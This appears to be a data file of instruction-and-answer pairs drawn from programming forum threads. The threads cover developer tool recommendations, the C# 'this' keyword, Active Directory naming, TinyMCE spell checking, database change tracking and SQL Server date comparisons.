{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "Notepad++ for sure"}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "There are several usages of this keyword in C#.\n\nTo qualify members hidden by similar name\nTo have an object pass itself as a parameter to other methods\nTo have an object return itself from a method\nTo declare indexers\nTo declare extension methods\nTo pass parameters between constructors\nTo internally reassign value type (struct) value.\nTo invoke an extension method on the current instance\nTo cast itself to another type\nTo chain constructors defined in the same class\n\nYou can avoid the first usage by not having member and local variables with the same name in scope, for example by following common naming conventions and using properties (Pascal case) instead of fields (camel case) to avoid colliding with local variables (also camel case). In C# 3.0 fields can be converted to properties easily by using auto-implemented properties."}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "I like Whole Tomato's Visual Assist X plug-in for Visual Studio. I think you get the \"most\" out of it when programming in C++ (and especially older versions of visual studio), but there are some additional syntax highlighting and refactoring tools, plus a decent search based on context / scope."}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "I cannot live without Eclipse and Mylyn"}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "Komodo Edit, Cygwin (ssh, cat, less, sed, grep, etc.), Python, TortoiseSVN, TortoiseCVS"}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "Scott Hanselman has a great, updated every year or two list of tools: Scott Hanselman's Ultimate Developer and Power Users Tool List for Windows"}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "A good editor and your compiler of choice.\nSure, some tools make your job a little easier.  Developing .Net applications without using Visual Studio would be more convoluted, but I would bet that at the end of the task, using only a text editor and the csc compiler, you would have a guru like comprehension of the language in no time at all.  You would learn things that other people may never get into.\nOf course, a good debugger helps (Also built into VS).  I use Komodo for Perl development purely for the debugging tools involved.  Even though I still prefer to edit the code using e-TextEditor."}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "Here's when I use it:\n\nAccessing Private Methods from within the class (to differentiate)\nPassing the current object to another method (or as a sender object, in case of an event)\nWhen creating extension methods :D\n\nI don't use this for Private fields because I prefix private field variable names with an underscore (_)."}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "Subversion + TortoiseSVN"}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "In no particular order (I'm a .NET web developer if you can't tell from the list):\n\nResharper - Keeps my code slim and clean!\nReflector - Every now and then you need to figure out how the heck something is working in the .NET library.\nFirebug - Every web developer has this installed because it makes markup and css debugging so much easier.\nTortoise SVN - By far the best version control system I have ever used.  Absolutely no complaints about it.\nNUnit - Unit testing that doesn't get in your way.  Plus it integrates nicely with Resharper!\nNotepad - For whatever reason, I can't shake the nostalgic feeling I get using this.  Still my go-to application for several things (to-do lists, quick side notes, quick and dirty clipboard, etc.)."}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "TextPad rocks! And CSSViewer (FF plug-in) is nice. Heard Firebug is even better, since it allows you to edit, too, but haven't tried it.\nAlso, virtual machines. I'm using using MS Virtual PC (w/ VM additions) right now for multiple projects and it suits my purposes well. I'm sure there are better vm solutions, too, I just haven't had to look into them.\nCrossLoop and Skype for collaboration/pair programming (particularly for remote employees).\nAgentRansak for text/file/foler searching. I haven't used this to it's full extent, since I'm new to it, so I don't know how robust it can be. It works well for what I use it for, though. I am much more familiar with TextPad's search/replace functionality (which rocks!)."}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "Another vote for notepad++\nFirebug or the dev toolbar in IE\nLifehackers Texter (for text expansion)\nI couldn't live my life on a computer without humanized's Enso product"}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "Notepadd++, Mercurial, FireFox, FireBug"}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "Winamp (I love coding with music playing in the background)\nCoffee"}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "Notepad2, e.TextEditor, Textmate\nWinSplit Revolution\nGoogle, Pandora\nSynergy\nFireBug\nSVN\nVisual Studio if .net app"}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "A lot of it depends on the kind of work I'm doing.  I use git or svn on pretty much everything I write these days.  Github has raised the bar for ease of collaboration and generally what I expect from an SCM repository.  TextMate always comes in useful for snippets, regex find and replace, and all sorts of little editing niceties; for most projects it's my primary text editor.  For Java I'll spend a good bit of time in Eclipse, and back when I was did .NET work I'd use Visual Studio.  If I'm scratching together a prototype design for a web site, I'll use Coda or something similar.\nIf you count libraries and frameworks as \"development tools,\" Ruby's regexes take the cake for ease of use.  Haskell's Parsec wins for doing serious parsing, followed very closely by Java's ANTLR.  Hype be damned, I've yet to be as productive writing a web app than I am with Ruby on Rails, though Pylons in Python land is nice.  Likewise with Visual Studio for doing client side GUI work, though I think CocoaXCode in Leopard could be very competitive if I ever get a good grasp on Objective-C.  LLVM's IR is the new assembly if you're writing a compiler."}
{"instruction": "I'm looking for a way to find a the windows login associated with a specific group. I'm trying to add permissions to a tool that only allows names formatted like:\nDOMAIN\\USER \nDOMAIN\\GROUP\n\nI have a list of users in active directory format that I need to add:\nou=group1;ou=group2;ou=group3\n\nI have tried adding DOMAIN\\Group1, but I get a 'user not found' error.\nP.S.  should also be noted that I'm not a Lan admin", "output": "OU is an Organizational Unit (sort of like a Subfolder in Explorer), not a Group, Hence group1, 2 and 3 are not actually groups.\nYou are looking for the DN Attribute, also called \"distinguishedName\". You can simply use DOMAIN\\DN once you have that.\nEdit: For groups, the CN (Common Name) could also work. \nThe full string from Active Directory normally looks like this:\n\ncn=Username,cn=Users,dc=DomainName,dc=com\n\n(Can be longer or shorter, but the important bit is that the \"ou\" part is worthless for what you're trying to achieve."}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "Vim, Cygwin, TortoiseSVN, Eclipse. SoapUI is an awesome tool if you're working with SOAP web services. I also find TCPTrace a very handy little tool."}
{"instruction": "I'm using TinyMCE in an ASP.Net project, and I need a spell check. The only TinyMCE plugins I've found use PHP on the server side, and I guess I could just break down and install PHP on my server and do that, but quite frankly, what a pain. I don't want to do that.\nAs it turns out, Firefox's built-in spell check will work fine for me, but it doesn't seem to work on TinyMCE editor boxes. I've enabled the gecko_spellcheck option, which is supposed to fix it, but it doesn't.\nDoes anybody know of a nice rich-text editor that doesn't break the browser's spell check?", "output": "I know at least yahoo!'s Rich Text Editor will let you use the included spell checker in FireFox.\nI also tested FCKeditor, but that requires the users to install additional plugins on their computer."}
{"instruction": "I'm looking for a way to find a the windows login associated with a specific group. I'm trying to add permissions to a tool that only allows names formatted like:\nDOMAIN\\USER \nDOMAIN\\GROUP\n\nI have a list of users in active directory format that I need to add:\nou=group1;ou=group2;ou=group3\n\nI have tried adding DOMAIN\\Group1, but I get a 'user not found' error.\nP.S.  should also be noted that I'm not a Lan admin", "output": "Programatically or Manually?\nManually, i prefer AdExplorer, which is a nice Active directory Browser. You just connect to your domain controller and then you can look for the user and see all the details. Of course, you need permissions on the Domain Controller, not sure which though.\nProgramatically, it depends on your language of couse. On .net, the System.DirectoryServices Namespace is your friend. (I don't have any code examples here unfortunately)\nFor Active Directory, I'm not really an expert apart from how to query it, but here are two links I found useful:\nhttp://www.computerperformance.co.uk/Logon/LDAP_attributes_active_directory.htm\nhttp://en.wikipedia.org/wiki/Active_Directory (General stuff about the Structure of AD)"}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "Let me be general [then specific]:\n\nYour IDE of choice [VS 2008 here]\nYour debugger [It is usually part of your IDE, but sometimes WinDbg is needed]\nIts plugins for refactoring and source control [Resharper 4+ and Ankh SVN 2+]\nYour OS's addons for source control [Tortoise SVN]\nA better Diff and Merge Tool to plug into the above SCM tools [WinMerge]\nA fast loading text editor for when your IDE is too much [vim, Notepad++]\nIf you're doing web development, get tools for that [Firefox 3 with Add-ons: Web Developer, Firebug, TamperData, Poster, Firecookie, FireFTP, FirePHP, Rainbow for Firebug, ReloadEvery, Selenium IDE]\nRequisite tools for working with text [GNU TextUtils, via cygwin or gnuwin32.sf.net]\nScripting tools [Perl, Python, zsh, all those GNU base packages in cygwin]\nA Regular Expression testing tool for when your eyes hurt [Expresso, RegexBuddy]\n\nFor Java I swap out 1 and 3 with Eclipse, and its plugins for Maven and SVN, I haven't found a refactoring plug in... you'd think I'd use IntelliJ IDEA but I never started using it."}
{"instruction": "I'm looking for a way to find a the windows login associated with a specific group. I'm trying to add permissions to a tool that only allows names formatted like:\nDOMAIN\\USER \nDOMAIN\\GROUP\n\nI have a list of users in active directory format that I need to add:\nou=group1;ou=group2;ou=group3\n\nI have tried adding DOMAIN\\Group1, but I get a 'user not found' error.\nP.S.  should also be noted that I'm not a Lan admin", "output": "You need to go to the Active Directory Users Snap In after logging in as a domain admin on the machine:\n\nGo to start --> run and type in mmc.\nIn the MMC console go to File -->\nAdd/Remove Snap-In Click Add Select\nActive Directory Users and Computers and select Add. \nHit Close and then hit OK.\n\nFrom here you can expand the domain tree and search (by right-clicking on the domain name).\nYou may not need special privileges to view the contents of the Active Directory domain, especially if you are logged in on that domain.  It is worth a shot to see how far you can get.  \nWhen you search for someone, you can select the columns from View --> Choose Columns.  This should help you search for the person or group you are looking for."}
{"instruction": "I'm looking for a way to find a the windows login associated with a specific group. I'm trying to add permissions to a tool that only allows names formatted like:\nDOMAIN\\USER \nDOMAIN\\GROUP\n\nI have a list of users in active directory format that I need to add:\nou=group1;ou=group2;ou=group3\n\nI have tried adding DOMAIN\\Group1, but I get a 'user not found' error.\nP.S.  should also be noted that I'm not a Lan admin", "output": "Thanks adeel825 & Michael Stum. \nMy problem is, though, i'm in a big corporation and do not have access to log in as the domain admin nor to view the active directory, so i guess my solution is to try and get that level of access."}
{"instruction": "I am looking for open source or free data collaboration software. Specifically this is for a non-profit organization that wants to teach remote students how a foreign language.  The idea is that an instructor would teach a class and there would be up to 10 students in the class at a time.  The instructor would be able to post slides or other teaching material and the students would be able to see it on their computers remotely.  Video is not required but audio is a must.  Any recommendations?\nAlso if there have been any reviews or feature comparison amongst these products, I would be interested in hearing about them.", "output": "I know a few of the developers on the Carleton University developed Blindside Project.  They are actively developing an open-source web conferencing and presentation tool for e-learning, with the intent of eventually offering university courses online.\nIt's pretty fully featured software, and is meant to be installed as a server that can host many conference rooms at a time.  It has voice, video, text, and a whiteboard/slideshow (Edit: supports PDF at the moment) capability.  One feature I think it neat is that students can 'raise their hands' in the class to ask the instructor a question, where they can take the floor for a moment.\nCheck out the demo on the site (if it's not working anymore I'll nudge the developers).  Another pro is that the clients only need to have flash installed.\nI just logged onto the online demo and created this preview:\nThis project is now called BigBlueButton : http://code.google.com/p/bigbluebutton/\nHere is the demo: http://demo.bigbluebutton.org/"}
{"instruction": "I am looking for open source or free data collaboration software. Specifically this is for a non-profit organization that wants to teach remote students how a foreign language.  The idea is that an instructor would teach a class and there would be up to 10 students in the class at a time.  The instructor would be able to post slides or other teaching material and the students would be able to see it on their computers remotely.  Video is not required but audio is a must.  Any recommendations?\nAlso if there have been any reviews or feature comparison amongst these products, I would be interested in hearing about them.", "output": "I do not have personal experience with this product, but dokeos is recommended by several people on other sites."}
{"instruction": "I am looking for open source or free data collaboration software. Specifically this is for a non-profit organization that wants to teach remote students how a foreign language.  The idea is that an instructor would teach a class and there would be up to 10 students in the class at a time.  The instructor would be able to post slides or other teaching material and the students would be able to see it on their computers remotely.  Video is not required but audio is a must.  Any recommendations?\nAlso if there have been any reviews or feature comparison amongst these products, I would be interested in hearing about them.", "output": "@adeel - I think this blog entry can give you some details at least about one user that has tried DimDim."}
{"instruction": "I'm looking for a way to find a the windows login associated with a specific group. I'm trying to add permissions to a tool that only allows names formatted like:\nDOMAIN\\USER \nDOMAIN\\GROUP\n\nI have a list of users in active directory format that I need to add:\nou=group1;ou=group2;ou=group3\n\nI have tried adding DOMAIN\\Group1, but I get a 'user not found' error.\nP.S.  should also be noted that I'm not a Lan admin", "output": "Well, AdExplorer runs on your Local Workstation (which is why I prefer it) and I believe that most users have read access to AD anyway because that's actually required for stuff to work, but I'm not sure about that."}
{"instruction": "I am looking for open source or free data collaboration software. Specifically this is for a non-profit organization that wants to teach remote students how a foreign language.  The idea is that an instructor would teach a class and there would be up to 10 students in the class at a time.  The instructor would be able to post slides or other teaching material and the students would be able to see it on their computers remotely.  Video is not required but audio is a must.  Any recommendations?\nAlso if there have been any reviews or feature comparison amongst these products, I would be interested in hearing about them.", "output": "The BlindSide site also listed these other projects:\n\nePresence\nOpenMeetings\nDimDim\nWebHuddle\n\nAll opensource as well."}
{"instruction": "I'm looking for a way to find a the windows login associated with a specific group. I'm trying to add permissions to a tool that only allows names formatted like:\nDOMAIN\\USER \nDOMAIN\\GROUP\n\nI have a list of users in active directory format that I need to add:\nou=group1;ou=group2;ou=group3\n\nI have tried adding DOMAIN\\Group1, but I get a 'user not found' error.\nP.S.  should also be noted that I'm not a Lan admin", "output": "You do not need domain admin rights to look at the active directory. By default, any (authenticated?) user can read the information that you need from the directory.\nIf that wasn't the case, for example, a computer (which has an associated account as well) could not verify the account and password of its user.\nYou only need admin rights to change the contents of the directory.\nI think it is possible to set more restricted permissions, but that's not likely the case."}
{"instruction": "I'm using TinyMCE in an ASP.Net project, and I need a spell check. The only TinyMCE plugins I've found use PHP on the server side, and I guess I could just break down and install PHP on my server and do that, but quite frankly, what a pain. I don't want to do that.\nAs it turns out, Firefox's built-in spell check will work fine for me, but it doesn't seem to work on TinyMCE editor boxes. I've enabled the gecko_spellcheck option, which is supposed to fix it, but it doesn't.\nDoes anybody know of a nice rich-text editor that doesn't break the browser's spell check?", "output": "TinyMCE only goes out of its way to disable spell-checking when you don't specify the gecko_spellcheck option (i verified this with their example code). Might want to double-check your tinyMCE.init() call - it should look something like this:\ntinyMCE.init({\n\tmode : \"textareas\",\n\ttheme : \"simple\",\n\tgecko_spellcheck : true\n});"}
{"instruction": "What are some strategies that people have had success with for maintaining a change history for data in a fairly complex database. One of the applications that I frequently use and develop for could really benefit from a more comprehensive way of tracking how records have changed over time. For instance, right now records can have a number of timestamp and modified user fields, but we currently don't have a scheme for logging multiple change, for instance if an operation is rolled back. In a perfect world, it would be possible to reconstruct the record as it was after each save, etc.\nSome info on the DB:\n\nNeeds to have the capacity to grow by thousands of records per week\n50-60 Tables\nMain revisioned tables may have several million records each\nReasonable amount of foreign keys and indexes set\nUsing PostgreSQL 8.x", "output": "In the past I have used triggers to construct db update/insert/delete logging. \nYou could insert a record each time one of the above actions is done on a specific table into a logging table that keeps track of the action, what db user did it, timestamp, table it was preformed on, and previous value. \nThere is probably a better answer though as this would require you to cache the value before the actual delete or update was preformed I think. But you could use this to do rollbacks."}
{"instruction": "What are some strategies that people have had success with for maintaining a change history for data in a fairly complex database. One of the applications that I frequently use and develop for could really benefit from a more comprehensive way of tracking how records have changed over time. For instance, right now records can have a number of timestamp and modified user fields, but we currently don't have a scheme for logging multiple change, for instance if an operation is rolled back. In a perfect world, it would be possible to reconstruct the record as it was after each save, etc.\nSome info on the DB:\n\nNeeds to have the capacity to grow by thousands of records per week\n50-60 Tables\nMain revisioned tables may have several million records each\nReasonable amount of foreign keys and indexes set\nUsing PostgreSQL 8.x", "output": "One strategy you could use is MVCC, Multi-Value Concurrency Control.  In this scheme, you never do updates to any of your tables, you just do inserts, maintaining version numbers for each record.  This has the advantage of providing an exact snapshot from any point in time, and it also completely sidesteps the update lock problems that plague many databases.\nBut it makes for a huge database, and selects all require an extra clause to select the current version of a record."}
{"instruction": "What are some strategies that people have had success with for maintaining a change history for data in a fairly complex database. One of the applications that I frequently use and develop for could really benefit from a more comprehensive way of tracking how records have changed over time. For instance, right now records can have a number of timestamp and modified user fields, but we currently don't have a scheme for logging multiple change, for instance if an operation is rolled back. In a perfect world, it would be possible to reconstruct the record as it was after each save, etc.\nSome info on the DB:\n\nNeeds to have the capacity to grow by thousands of records per week\n50-60 Tables\nMain revisioned tables may have several million records each\nReasonable amount of foreign keys and indexes set\nUsing PostgreSQL 8.x", "output": "If you are using Hibernate, take a look at JBoss Envers. From the project homepage:\n\nThe Envers project aims to enable easy versioning of persistent JPA classes. All that you have to do is annotate your persistent class or some of its properties, that you want to version, with @Versioned. For each versioned entity, a table will be created, which will hold the history of changes made to the entity. You can then retrieve and query historical data without much effort. \n\nThis is somewhat similar to Eric's approach, but probably much less effort. Don't know, what language/technology you use to access the database, though."}
{"instruction": "Here is the issue I am having: I have a large query that needs to compare datetimes in the where clause to see if two dates are on the same day.  My current solution, which sucks, is to send the datetimes into a UDF to convert them to midnight of the same day, and then check those dates for equality.  When it comes to the query plan, this is a disaster, as are almost all UDFs in joins or where clauses.  This is one of the only places in my application that I haven't been able to root out the functions and give the query optimizer something it can actually use to locate the best index.\nIn this case, merging the function code back into the query seems impractical.\nI think I am missing something simple here.\nHere's the function for reference.\nif not exists (select * from dbo.sysobjects \n              where id = object_id(N'dbo.f_MakeDate') and               \n              type in (N'FN', N'IF', N'TF', N'FS', N'FT'))\n  exec('create function dbo.f_MakeDate() returns int as \n         begin declare @retval int return @retval end')\ngo\n\nalter function dbo.f_MakeDate\n(\n    @Day datetime, \n    @Hour int, \n    @Minute int\n)\nreturns datetime\nas\n\n/*\n\nCreates a datetime using the year-month-day portion of @Day, and the \n@Hour and @Minute provided\n\n*/\n\nbegin\n\ndeclare @retval datetime\nset @retval = cast(\n    cast(datepart(m, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(d, @Day) as varchar(2)) + \n    '/' + \n    cast(datepart(yyyy, @Day) as varchar(4)) + \n    ' ' + \n    cast(@Hour as varchar(2)) + \n    ':' + \n    cast(@Minute as varchar(2)) as datetime)\nreturn @retval\nend\n\ngo\n\nTo complicate matters, I am joining on time zone tables to check the date against the local time, which could be different for every row:\nwhere \ndbo.f_MakeDate(dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), 0, 0) = @activityDateMidnight\n\n[Edit]\nI'm incorporating @Todd's suggestion:\nwhere datediff(day, dateadd(hh, tz.Offset + \n    case when ds.LocalTimeZone is not null \n    then 1 else 0 end, t.TheDateINeedToCheck), @ActivityDate) = 0\n\nMy misconception about how datediff works (the same day of year in consecutive years yields 366, not 0 as I expected) caused me to waste a lot of effort.\nBut the query plan didn't change.  I think I need to go back to the drawing board with the whole thing.", "output": "Eric Z Beard:\n\nthe activity date is meant to indicate the local time zone, but not a specific one\n\nOkay - back to the drawing board. Try this:\nwhere t.TheDateINeedToCheck BETWEEN (\n    dateadd(hh, (tz.Offset + ISNULL(ds.LocalTimeZone, 0)) * -1, @ActivityDate)\n    AND\n    dateadd(hh, (tz.Offset + ISNULL(ds.LocalTimeZone, 0)) * -1, (@ActivityDate + 1))\n)\n\nwhich will translate the @ActivityDate to local time, and compare against that. That's your best chance for using an index, though I'm not sure it'll work - you should try it and check the query plan.\nThe next option would be an indexed view, with an indexed, computed TimeINeedToCheck in local time. Then you just go back to:\nwhere v.TheLocalDateINeedToCheck BETWEEN @ActivityDate AND (@ActivityDate + 1)\n\nwhich would definitely use the index - though you have a slight overhead on INSERT and UPDATE then."}
{"instruction": "I recently burned up my development laptop (it literally emitted smoke from the vents). After pulling the hd I was unable to get it to spin with a USB device attached to a home tower. Since I was on a deadline I had to rush and buy a new laptop (Turion 64 x2) running Vista.\nAfter I installed my required applications VS2005/2008, Sql Server editions client tools, Adobe CS3, and source control clients: I am wondering what list of \u201cmust haves\u201d developer tools that are out there these days? I\u2019m a big fan of Fiddler and LinqPad, but I am wondering what I am missing?\n[edit]I read the other question here and I am aware of Hanselman's list. I was not specific enough in my original question. By \"these days\" I meant new and latest tools (perhaps available only 64 bit), which in geek years might just be 12 days, I dunno. :)[/edit]", "output": "For Windows work:\nBeyond Compare - great diffing tool, works well with files and folders.\nLaunchy - lets me start programs without moving my hands from the keyboard."}
